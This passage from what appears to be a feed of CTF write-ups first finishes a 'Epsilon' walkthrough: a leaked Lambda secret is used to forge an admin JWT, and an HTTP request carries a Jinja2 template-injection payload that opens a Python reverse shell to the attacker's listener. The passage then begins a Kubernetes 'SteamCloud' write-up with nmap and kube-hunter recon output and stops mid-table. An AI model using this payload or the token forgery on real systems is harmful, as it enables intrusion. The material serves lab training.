        <span style="color:#e6db74">&#34;Location&#34;</span>: <span style="color:#e6db74">&#34;http://cloud.epsilon.htb/2015-03-31/functions/costume_shop_v1/code&#34;</span>
    <span style="color:#f92672">}</span>,
    <span style="color:#e6db74">&#34;Tags&#34;</span>: <span style="color:#f92672">{}</span>

</code></pre></div><p>Visit url and get the function</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

secret<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;RrXCv`mrNe!K!4+5`wYq&#39;</span> <span style="color:#75715e">#apigateway authorization for CR-124</span>

<span style="color:#e6db74">&#39;&#39;&#39;Beta release for tracking&#39;&#39;&#39;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">lambda_handler</span>(event, context):
    <span style="color:#66d9ef">try</span>:
        id<span style="color:#f92672">=</span>event[<span style="color:#e6db74">&#39;queryStringParameters&#39;</span>][<span style="color:#e6db74">&#39;order_id&#39;</span>]
        <span style="color:#66d9ef">if</span> id:
            <span style="color:#66d9ef">return</span> {
               <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">200</span>,
               <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(str(resp)) <span style="color:#75715e">#dynamodb tracking for CR-342</span>
            }
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">return</span> {
                <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">500</span>,
                <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(<span style="color:#e6db74">&#39;Invalid Order ID&#39;</span>)
            }
    <span style="color:#66d9ef">except</span>:
        <span style="color:#66d9ef">return</span> {
                <span style="color:#e6db74">&#39;statusCode&#39;</span>: <span style="color:#ae81ff">500</span>,
                <span style="color:#e6db74">&#39;body&#39;</span>: json<span style="color:#f92672">.</span>dumps(<span style="color:#e6db74">&#39;Invalid Order ID&#39;</span>)
            }

</code></pre></div><p>we can use this secret to login admin in app port 5000. Craft jwt in <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a> with private key and get authorization.</p>
<p><img src="/img/htb_epsilon_jwt.png" alt=""></p>
<p>Get admin page</p>
<p><img src="/img/htb_epsilon_admin.png" alt=""></p>
<p>In Order page, input costume is reflected, because this web using flask, i suspect we can SSTI from that.</p>
<p><img src="/img/htb_epsilon_order1.png" alt=""></p>
<p><img src="/img/htb_epsilon_order2.png" alt=""></p>
<p>Get RCE :</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">POST <span style="color:#f92672">/</span>order<span style="color:#960050;background-color:#1e0010">?</span>input<span style="color:#f92672">=</span>python3<span style="color:#f92672">+-</span>c<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;import+socket,subprocess,os%3bs</span><span style="color:#e6db74">%3d</span><span style="color:#e6db74">socket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((&#34;10.10.14.3&#34;,9000))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(&#34;sh&#34;)&#39;</span> HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host: <span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">220</span>
Cache<span style="color:#f92672">-</span>Control: max<span style="color:#f92672">-</span>age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
Upgrade<span style="color:#f92672">-</span>Insecure<span style="color:#f92672">-</span>Requests: <span style="color:#ae81ff">1</span>
Origin: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span>
Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>x<span style="color:#f92672">-</span>www<span style="color:#f92672">-</span>form<span style="color:#f92672">-</span>urlencoded
User<span style="color:#f92672">-</span>Agent: Mozilla<span style="color:#f92672">/</span><span style="color:#ae81ff">5.0</span> (X11; Linux x86_64) AppleWebKit<span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span> (KHTML, like Gecko) Chrome<span style="color:#f92672">/</span><span style="color:#ae81ff">96.0.4664.45</span> Safari<span style="color:#f92672">/</span><span style="color:#ae81ff">537.36</span>
Accept: text<span style="color:#f92672">/</span>html,application<span style="color:#f92672">/</span>xhtml<span style="color:#f92672">+</span>xml,application<span style="color:#f92672">/</span>xml;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,image<span style="color:#f92672">/</span>avif,image<span style="color:#f92672">/</span>webp,image<span style="color:#f92672">/</span>apng,<span style="color:#f92672">*/*</span>;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span>,application<span style="color:#f92672">/</span>signed<span style="color:#f92672">-</span>exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>
Referer: http:<span style="color:#f92672">//</span><span style="color:#ae81ff">10.129.96.99</span>:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span>order
Accept<span style="color:#f92672">-</span>Encoding: gzip, deflate
Cookie: auth<span style="color:#f92672">=</span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9<span style="color:#f92672">.</span>eyJ1c2VybmFtZSI6ImFkbWluIn0<span style="color:#f92672">.</span>WFYEm2<span style="color:#f92672">-</span>bZZxe2qpoAtRPBaoNekx<span style="color:#f92672">-</span>oOwueA80zzb3Rc4
Accept<span style="color:#f92672">-</span>Language: en<span style="color:#f92672">-</span>US,en;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.9</span>,id;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.8</span>,ms;q<span style="color:#f92672">=</span><span style="color:#ae81ff">0.7</span>
Connection: close

costume<span style="color:#f92672">=</span>{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span><span style="color:#66d9ef">for</span><span style="color:#f92672">+</span>x<span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__()<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span>}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span><span style="color:#f92672">+</span><span style="color:#66d9ef">if</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;warning&#34;</span><span style="color:#f92672">+</span><span style="color:#f92672">in</span><span style="color:#f92672">+</span>x<span style="color:#f92672">.</span>__name__<span style="color:#f92672">+%</span><span style="color:#ae81ff">25</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>input)<span style="color:#f92672">.</span>read()}}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>endif<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>}{<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>endfor<span style="color:#f92672">%</span><span style="color:#ae81ff">25</span>}<span style="color:#f92672">&amp;</span>q<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&amp;</span>addr<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>

nc <span style="color:#f92672">-</span>lnvp <span style="color:#ae81ff">9000</span>
Listening on <span style="color:#ae81ff">0.0.0.0</span> <span style="color:#ae81ff">9000</span>
Connection received on <span style="color:#ae81ff">10.129.96.99</span> <span style="color:#ae81ff">38578</span>
<span style="color:#960050;background-color:#1e0010">$</span> ls
ls
app<span style="color:#f92672">.</span>py  static  templates
<span style="color:#960050;background-color:#1e0010">$</span> cd <span style="color:#f92672">..</span>
cd <span style="color:#f92672">..</span>
l<span style="color:#960050;background-color:#1e0010">$</span> s
ls
app  flag<span style="color:#f92672">.</span>txt  html
<span style="color:#960050;background-color:#1e0010">$</span> cat flag<span style="color:#f92672">.</span>txt
cat flag<span style="color:#f92672">.</span>txt
HTB{l4mbd4_l34ks_4r3_fun<span style="color:#960050;background-color:#1e0010">!!!</span>}<span style="color:#960050;background-color:#1e0010">$</span>


</code></pre></div><p>FLAG : <code>HTB{l4mbd4_l34ks_4r3_fun!!!}</code></p>
]]></content>
        </item>
        
        <item>
            <title>HTB UNI CTF - Cloud - SteamCloud Writeup</title>
            <link>/posts/htb-uni-ctf-steamcloud-writeup/</link>
            <pubDate>Wed, 24 Nov 2021 13:46:24 +0700</pubDate>
            
            <guid>/posts/htb-uni-ctf-steamcloud-writeup/</guid>
            <description>Intro We&amp;rsquo;ve installed our Kubernetes cluster inside a steam powered computer, however there&amp;rsquo;s a lot of smoke, therefore we think a bolt is missing. Could you please investigate?
TLDR  Exposed and Unrestricted Kubelet RCE in POD nginx namespace default Get Service Account nginx Access Cluster using Service Account Spawn privileged pod/Mounting host on pod PWNED  Recon Nmap using nmap try to scan open port.
Open 10.129.96.107:22 Open 10.129.96.107:2379 Open 10.</description>
            <content type="html"><![CDATA[<h1 id="intro">Intro</h1>
<p>We&rsquo;ve installed our Kubernetes cluster inside a steam powered computer, however there&rsquo;s a lot of smoke, therefore we think a bolt is missing. Could you please investigate?</p>
<h1 id="tldr">TLDR</h1>
<ul>
<li>Exposed and Unrestricted Kubelet</li>
<li>RCE in POD nginx namespace default</li>
<li>Get Service Account nginx</li>
<li>Access Cluster using Service Account</li>
<li>Spawn privileged pod/Mounting host on pod</li>
<li>PWNED</li>
</ul>
<h1 id="recon">Recon</h1>
<h2 id="nmap">Nmap</h2>
<p>using nmap try to scan  open port.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">22</span>
Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2379</span>
Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2380</span>
Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">8443</span>
Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10249</span>
Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Open <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10256</span>


PORT      STATE SERVICE          REASON  VERSION
<span style="color:#ae81ff">22</span><span style="color:#f92672">/</span>tcp    open  ssh              syn<span style="color:#f92672">-</span>ack OpenSSH <span style="color:#ae81ff">7.9</span>p1 Debian <span style="color:#ae81ff">10</span><span style="color:#f92672">+</span>deb10u2 (protocol <span style="color:#ae81ff">2.0</span>)
<span style="color:#ae81ff">2379</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>etcd<span style="color:#f92672">-</span>client<span style="color:#960050;background-color:#1e0010">?</span> syn<span style="color:#f92672">-</span>ack
<span style="color:#ae81ff">2380</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>etcd<span style="color:#f92672">-</span>server<span style="color:#960050;background-color:#1e0010">?</span> syn<span style="color:#f92672">-</span>ack
<span style="color:#ae81ff">8443</span><span style="color:#f92672">/</span>tcp  open  ssl<span style="color:#f92672">/</span>https<span style="color:#f92672">-</span>alt    syn<span style="color:#f92672">-</span>ack
<span style="color:#f92672">|</span> fingerprint<span style="color:#f92672">-</span>strings:
<span style="color:#f92672">|</span>   FourOhFourRequest:
<span style="color:#f92672">|</span>     HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">403</span> Forbidden
<span style="color:#f92672">|</span>     Audit<span style="color:#f92672">-</span>Id: <span style="color:#ae81ff">925790</span>b4<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>d9b<span style="color:#f92672">-</span><span style="color:#ae81ff">418</span>b<span style="color:#f92672">-</span><span style="color:#ae81ff">8</span>cf1<span style="color:#f92672">-</span>d3b374c94699
<span style="color:#f92672">|</span>     Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache, private
<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>json
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Flowschema<span style="color:#f92672">-</span>Uid: <span style="color:#ae81ff">49</span>cc0b4a<span style="color:#f92672">-</span><span style="color:#ae81ff">2076</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45e5</span><span style="color:#f92672">-</span>aa89<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c27ad51f52c
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Prioritylevel<span style="color:#f92672">-</span>Uid: eda95003<span style="color:#f92672">-</span>d6be<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span>f3<span style="color:#f92672">-</span><span style="color:#ae81ff">8845</span><span style="color:#f92672">-</span>f63b66cbf0d3
<span style="color:#f92672">|</span>     Date: Wed, <span style="color:#ae81ff">24</span> Nov <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">39</span> GMT
<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">212</span>
<span style="color:#f92672">|</span>     {<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:{},<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span><span style="color:#f92672">/</span>nice ports,<span style="color:#f92672">/</span>Trinity<span style="color:#f92672">.</span>txt<span style="color:#f92672">.</span>bak<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:{},<span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#ae81ff">403</span>}
<span style="color:#f92672">|</span>   GetRequest:
<span style="color:#f92672">|</span>     HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">403</span> Forbidden
<span style="color:#f92672">|</span>     Audit<span style="color:#f92672">-</span>Id: <span style="color:#ae81ff">029</span>b8f8e<span style="color:#f92672">-</span>f971<span style="color:#f92672">-</span><span style="color:#ae81ff">49</span>d2<span style="color:#f92672">-</span>a1b2<span style="color:#f92672">-</span>d07eeee0ad73
<span style="color:#f92672">|</span>     Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache, private
<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>json
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Flowschema<span style="color:#f92672">-</span>Uid: <span style="color:#ae81ff">49</span>cc0b4a<span style="color:#f92672">-</span><span style="color:#ae81ff">2076</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45e5</span><span style="color:#f92672">-</span>aa89<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c27ad51f52c
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Prioritylevel<span style="color:#f92672">-</span>Uid: eda95003<span style="color:#f92672">-</span>d6be<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span>f3<span style="color:#f92672">-</span><span style="color:#ae81ff">8845</span><span style="color:#f92672">-</span>f63b66cbf0d3
<span style="color:#f92672">|</span>     Date: Wed, <span style="color:#ae81ff">24</span> Nov <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">37</span> GMT
<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">185</span>
<span style="color:#f92672">|</span>     {<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:{},<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot get path &#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:{},<span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#ae81ff">403</span>}
<span style="color:#f92672">|</span>   HTTPOptions:
<span style="color:#f92672">|</span>     HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.0</span> <span style="color:#ae81ff">403</span> Forbidden
<span style="color:#f92672">|</span>     Audit<span style="color:#f92672">-</span>Id: <span style="color:#ae81ff">7</span>f890985<span style="color:#f92672">-</span><span style="color:#ae81ff">9</span>b0f<span style="color:#f92672">-</span><span style="color:#ae81ff">4957</span><span style="color:#f92672">-</span>a0bc<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>b82b652ab08
<span style="color:#f92672">|</span>     Cache<span style="color:#f92672">-</span>Control: no<span style="color:#f92672">-</span>cache, private
<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Type: application<span style="color:#f92672">/</span>json
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Content<span style="color:#f92672">-</span>Type<span style="color:#f92672">-</span>Options: nosniff
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Flowschema<span style="color:#f92672">-</span>Uid: <span style="color:#ae81ff">49</span>cc0b4a<span style="color:#f92672">-</span><span style="color:#ae81ff">2076</span><span style="color:#f92672">-</span><span style="color:#ae81ff">45e5</span><span style="color:#f92672">-</span>aa89<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>c27ad51f52c
<span style="color:#f92672">|</span>     X<span style="color:#f92672">-</span>Kubernetes<span style="color:#f92672">-</span>Pf<span style="color:#f92672">-</span>Prioritylevel<span style="color:#f92672">-</span>Uid: eda95003<span style="color:#f92672">-</span>d6be<span style="color:#f92672">-</span><span style="color:#ae81ff">44</span>f3<span style="color:#f92672">-</span><span style="color:#ae81ff">8845</span><span style="color:#f92672">-</span>f63b66cbf0d3
<span style="color:#f92672">|</span>     Date: Wed, <span style="color:#ae81ff">24</span> Nov <span style="color:#ae81ff">2021</span> <span style="color:#ae81ff">06</span>:<span style="color:#ae81ff">51</span>:<span style="color:#ae81ff">38</span> GMT
<span style="color:#f92672">|</span>     Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">189</span>
<span style="color:#f92672">|</span>_    {<span style="color:#e6db74">&#34;kind&#34;</span>:<span style="color:#e6db74">&#34;Status&#34;</span>,<span style="color:#e6db74">&#34;apiVersion&#34;</span>:<span style="color:#e6db74">&#34;v1&#34;</span>,<span style="color:#e6db74">&#34;metadata&#34;</span>:{},<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;Failure&#34;</span>,<span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;forbidden: User &#34;</span>system:anonymous<span style="color:#e6db74">&#34; cannot options path &#34;</span><span style="color:#f92672">/</span><span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;reason&#34;</span>:<span style="color:#e6db74">&#34;Forbidden&#34;</span>,<span style="color:#e6db74">&#34;details&#34;</span>:{},<span style="color:#e6db74">&#34;code&#34;</span>:<span style="color:#ae81ff">403</span>}
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (application/json).</span>
<span style="color:#f92672">|</span> Issuer: commonName<span style="color:#f92672">=</span>minikubeCA
<span style="color:#ae81ff">10249</span><span style="color:#f92672">/</span>tcp open  http             syn<span style="color:#f92672">-</span>ack Golang net<span style="color:#f92672">/</span>http server (Go<span style="color:#f92672">-</span>IPFS json<span style="color:#f92672">-</span>rpc <span style="color:#f92672">or</span> InfluxDB API)
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).</span>
<span style="color:#ae81ff">10250</span><span style="color:#f92672">/</span>tcp open  ssl<span style="color:#f92672">/</span>http         syn<span style="color:#f92672">-</span>ack Golang net<span style="color:#f92672">/</span>http server (Go<span style="color:#f92672">-</span>IPFS json<span style="color:#f92672">-</span>rpc <span style="color:#f92672">or</span> InfluxDB API)
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).</span>
<span style="color:#f92672">|</span> ssl<span style="color:#f92672">-</span>cert: Subject: commonName<span style="color:#f92672">=</span>steamcloud<span style="color:#f92672">@</span><span style="color:#ae81ff">1637736258</span>
<span style="color:#f92672">|</span> Subject Alternative Name: DNS:steamcloud
<span style="color:#f92672">|</span> Issuer: commonName<span style="color:#f92672">=</span>steamcloud<span style="color:#f92672">-</span>ca<span style="color:#f92672">@</span><span style="color:#ae81ff">1637736257</span>
<span style="color:#ae81ff">10256</span><span style="color:#f92672">/</span>tcp open  http             syn<span style="color:#f92672">-</span>ack Golang net<span style="color:#f92672">/</span>http server (Go<span style="color:#f92672">-</span>IPFS json<span style="color:#f92672">-</span>rpc <span style="color:#f92672">or</span> InfluxDB API)
<span style="color:#f92672">|</span>_http<span style="color:#f92672">-</span>title: Site doesn<span style="color:#e6db74">&#39;t have a title (text/plain; charset=utf-8).</span>

Service Info: OS: Linux; CPE: cpe:<span style="color:#f92672">/</span>o:linux:linux_kernel

</code></pre></div><p>Open port in machine look familiar, i suggest this minikube with using kubeapi in port 8443. Knowing this try to ensure by checking with kube-hunter.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">Remotes (separated by a <span style="color:#e6db74">&#39;,&#39;</span>): <span style="color:#ae81ff">10.129.96.107</span>
Started hunting
Discovering Open Kubernetes Services
Found open service <span style="color:#e6db74">&#34;Etcd&#34;</span> at <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2379</span>
Found open service <span style="color:#e6db74">&#34;Kubelet API&#34;</span> at <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Anonymous Authentication&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Exposed Pods&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Cluster Health Disclosure&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Exposed Running Pods&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Exposed Kubelet Cmdline&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Exposed Container Logs&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Exposed Run Inside Container&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>
Found vulnerability <span style="color:#e6db74">&#34;Exposed System Logs&#34;</span> <span style="color:#f92672">in</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span>

Nodes
<span style="color:#f92672">+-------------+---------------+</span>
<span style="color:#f92672">|</span> TYPE        <span style="color:#f92672">|</span> LOCATION      <span style="color:#f92672">|</span>
<span style="color:#f92672">+-------------+---------------+</span>
<span style="color:#f92672">|</span> Node<span style="color:#f92672">/</span>Master <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span> <span style="color:#f92672">|</span>
<span style="color:#f92672">+-------------+---------------+</span>

Detected Services
<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
<span style="color:#f92672">|</span> SERVICE     <span style="color:#f92672">|</span> LOCATION            <span style="color:#f92672">|</span> DESCRIPTION          <span style="color:#f92672">|</span>
<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
<span style="color:#f92672">|</span> Kubelet API <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">10250</span> <span style="color:#f92672">|</span> The Kubelet <span style="color:#f92672">is</span> the   <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> main component <span style="color:#f92672">in</span>    <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> every Node, all pod  <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> operations goes      <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> through the kubelet  <span style="color:#f92672">|</span>
<span style="color:#f92672">+-------------+---------------------+----------------------+</span>
<span style="color:#f92672">|</span> Etcd        <span style="color:#f92672">|</span> <span style="color:#ae81ff">10.129.96.107</span>:<span style="color:#ae81ff">2379</span>  <span style="color:#f92672">|</span> Etcd <span style="color:#f92672">is</span> a DB that    <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> stores cluster<span style="color:#e6db74">&#39;s     |</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> data, it contains    <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> configuration <span style="color:#f92672">and</span>    <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> current              <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span>     state            <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> information, <span style="color:#f92672">and</span>     <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> might contain        <span style="color:#f92672">|</span>
<span style="color:#f92672">|</span>             <span style="color:#f92672">|</span>                     <span style="color:#f92672">|</span> secrets              <span style="color:#f92672">|</span>
<span style="color:#f92672">+-------------+---------------------+----------------------+</span>

Vulnerabilities
For further information about a vulnerability, search its ID <span style="color:#f92672">in</span>:
https:<span style="color:#f92672">//</span>avd<span style="color:#f92672">.</span>aquasec<span style="color:#f92672">.</span>com<span style="color:#f92672">/</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
<span style="color:#f92672">|</span> ID     <span style="color:#f92672">|</span> LOCATION            <span style="color:#f92672">|</span> MITRE CATEGORY       <span style="color:#f92672">|</span> VULNERABILITY        <span style="color:#f92672">|</span> DESCRIPTION          <span style="color:#f92672">|</span> EVIDENCE             <span style="color:#f92672">|</span>
<span style="color:#f92672">+--------+---------------------+----------------------+----------------------+----------------------+----------------------+</span>
